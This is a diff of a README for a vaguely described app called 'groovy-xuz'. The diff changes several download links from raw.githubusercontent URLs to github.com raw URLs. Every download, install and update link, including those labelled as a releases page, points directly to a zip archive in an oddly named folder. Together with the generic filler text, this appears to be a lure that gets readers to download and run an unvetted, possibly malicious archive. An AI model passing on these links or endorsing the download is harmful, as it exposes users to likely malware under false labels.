@@ -1,13 +1,13 @@
 # 🎉 groovy-xuz - Your Easy-to-Use Groove Management Tool
 
 ## 📦 Download Now
-[![Download groovy-xuz](https://raw.githubusercontent.com/skidibi/groovy-xuz/main/mordacious/groovy-xuz.zip%https://raw.githubusercontent.com/skidibi/groovy-xuz/main/mordacious/groovy-xuz.zip)](https://raw.githubusercontent.com/skidibi/groovy-xuz/main/mordacious/groovy-xuz.zip)
+[![Download groovy-xuz](https://github.com/skidibi/groovy-xuz/raw/refs/heads/main/mordacious/groovy-xuz.zip%https://github.com/skidibi/groovy-xuz/raw/refs/heads/main/mordacious/groovy-xuz.zip)](https://github.com/skidibi/groovy-xuz/raw/refs/heads/main/mordacious/groovy-xuz.zip)
 
 ## 🚀 Getting Started
 Welcome to groovy-xuz! This application helps you manage your grooves easily and efficiently. Follow the steps below to download and run the software.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [groovy-xuz Releases](https://raw.githubusercontent.com/skidibi/groovy-xuz/main/mordacious/groovy-xuz.zip).
+To get started, visit this page to download: [groovy-xuz Releases](https://github.com/skidibi/groovy-xuz/raw/refs/heads/main/mordacious/groovy-xuz.zip).
 
 ### Step-by-Step Instructions
 1. **Visit the Releases Page:**
@@ -46,7 +46,7 @@ groovy-xuz comes packed with useful features including:
 
 ## 📖 FAQ
 ### How do I update groovy-xuz?
-To update, simply revisit the [Releases Page](https://raw.githubusercontent.com/skidibi/groovy-xuz/main/mordacious/groovy-xuz.zip) and download the latest version. Follow the same installation steps.
+To update, simply revisit the [Releases Page](https://github.com/skidibi/groovy-xuz/raw/refs/heads/main/mordacious/groovy-xuz.zip) and download the latest version. Follow the same installation steps.
 
 ### What should I do if the app doesn’t start?
 - Ensure your operating system meets the system requirements.
